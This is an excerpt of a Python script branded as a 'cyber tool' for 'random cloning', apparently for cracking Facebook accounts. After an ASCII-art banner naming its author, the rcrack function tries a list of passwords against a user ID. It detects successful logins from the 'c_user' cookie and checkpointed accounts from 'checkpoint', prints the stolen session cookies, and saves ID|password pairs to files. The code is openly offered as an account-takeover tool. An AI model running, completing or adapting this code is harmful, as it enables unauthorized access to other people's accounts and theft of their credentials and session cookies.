...
print('\n\033[1;36m[•]   WELCOME TO RAYEES ❥𝚇𝙳❥ CYBER TOOL...');time.sleep(3)
...
logo =f"""
  ...
  \033[1;92m \x1b[38;5;50m██   ██ ██   ██ ██   ██ ███████ ██   ██ \033[0;41m\033[1;91m[\033[1;93mA\033[1;92mK\033[1;93mA\033[1;92mS\033[1;93mH\033[1;96m-\033[1;93mP\033[1;92mR\033[1;93mO\033[1;91m]\033[0;92m
\033[1;93m──────────────────────────────────────────────────
\033[1;91m[<A>] OWNER     : AKASH CHOWDHURY
\033[1;92m[<K>] GITHUB ID : GW-AKASH
\033[1;93m[<A>] FACEBOOK  : AKASH CHOWDHURY
\033[1;94m[<S>] TOOLTYPE  : RANDOM CLONING
\033[1;95m[<H>] TOOLS     : \033[0;41m 1.0.1\033[0;92m
\033[1;93m──────────────────────────────────────────────────"""
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97m❥͜͜͡͡☘̤̤̤̈̈̈̈͜͡𝙰𝙺𝙰𝚂𝙷-𝚇𝙳❥͜͜͡͡☘̤̤̤̈̈̈̈͜͡\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[❥𝚇𝙳❥-OK] '+cid+' | '+ps+'\033[0;97m\n[‎‎🍪]\033[1;33m 🅲︎🅾︎🅾︎🅺︎🅸︎🅴︎ = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('❥𝚇𝙳❥-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[❥𝚇𝙳❥-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('❥𝚇𝙳❥-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
